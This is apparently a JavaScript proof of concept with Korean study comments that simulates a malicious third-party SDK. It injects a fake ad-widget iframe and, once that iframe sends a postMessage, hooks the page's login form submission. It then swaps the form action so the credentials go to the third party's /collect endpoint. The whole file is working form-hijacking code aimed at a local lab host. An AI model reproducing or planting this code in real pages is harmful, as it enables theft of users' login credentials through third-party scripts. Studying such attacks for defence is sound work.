//시작하자마자 실행되는 함수의 구조(sdk공부 빡쎄네....), window오염을 피하기 위해 캡슐화를 하는 목적이 크다. 변수나 함수를 window에 노출하지 않는것도 크다.
(() => {
  const THIRD_PARTY_ORIGIN = "http://localhost:4000";//주소
  let armed = false;//상태 변수 'armed', submit 시점에 이 값이 true라면 action을 바꿔치기 함. 광고를 누른적없으면 로그인 창은 잘못이 없었던 거임....

  console.log("[thirdparty sdk] loaded");


  //페이지에 광고 위젯처럼 보이는 iframe을 삽입합니다.
  function injectAdWidget() {
    //위젯 중복 방지
    if (document.getElementById("adWidgetContainer")) return;

    //위젯 컨테이너 생성
    const container = document.createElement("div");
    container.id = "adWidgetContainer";
    container.style.cssText = `
      position: fixed;
      right: 16px;
      bottom: 16px;
      width: 300px;
      height: 250px;
      z-index: 9999;
      box-shadow: 0 8px 30px rgba(0,0,0,0.25);
      border-radius: 12px;
      overflow: hidden;
      background: white;
    `;
    
    //iframe 생성
    const iframe = document.createElement("iframe");
    iframe.src = `${THIRD_PARTY_ORIGIN}/widget.html`;
    iframe.width = "300";
    iframe.height = "250";
    iframe.style.border = "0";
    iframe.setAttribute("title", "Ad Widget");

    container.appendChild(iframe);//iframe을 container의 child 요소로 추가
    document.documentElement.appendChild(container);//container를 dom트리의 child 요소로 추가
  }

  //iframe으로부터 postMessage를 받아서 armed 상태를 true로 만든다.
  function setupMessageListener() {
    window.addEventListener("message", (event) => {
      if (event.origin !== THIRD_PARTY_ORIGIN) return;//origin 체크는 해야지

      //widget.html에 있는 정보들인데, data가 일치하면 armed를 true로 합니다.
      const data = event.data || {};
      if (data.type === "AD_INTERACTION" && data.action === "ARM_FORM_SWAP") {
        armed = true;

        //이건 부가적인 요소들....없어도 됨
        console.log("[thirdparty sdk] armed by widget message");
        const status = document.getElementById("status");
        if (status) status.textContent += " | thirdparty:armed(by postMessage)";
      }
    });
  }


  //submit 시점에서 armed=ture면 바로 후킹 작동
  function hookFormSubmit() {
    const form = document.getElementById("loginForm");
    if (!form) return;

    form.addEventListener(
      "submit",
      (e) => {
        if (!armed) return;

        const submitter = e.submitter || null;//submit 클릭이 한번은 씹히는 현상이 있어서, submit이벤트를 담아뒀다가 호출하는 식으로 연결했습니다.

        //루프 방지용
        if (form.dataset.pocResubmitting === "1") {
            form.dataset.pocResubmitting = "0";
            return;
        }

        //제출 흐름을 직접 잡아서 안정적으로 다시제출 하는 방식
        e.preventDefault();

        //form.action으로 지정된 주소를 바꿔치기 합니다.(참조값 조작형 후킹)
        form.action = `${THIRD_PARTY_ORIGIN}/collect`;
        console.log("[thirdparty sdk] swapped form.action to", form.action);

        //루프방지 그거
        form.dataset.pocResubmitting = "1";

        //아까 멈췄으니 이제 제출
        queueMicrotask(() => {
            if (typeof form.requestSubmit === "function") {
                form.requestSubmit(submitter);//사용자가 submit 버튼을 눌러서 제출한 것처럼 보내기
            } else {
                form.submit();//만약 안되면 그냥 이벤트 무시하고 서버로 보내기
            }
        });
      },
      { capture: true }//submit이벤트가 도달하기전에 관여할려면 필요함
    );
  }

  document.addEventListener("DOMContentLoaded", () => {
    injectAdWidget();
    setupMessageListener();
    hookFormSubmit();
  });
})();
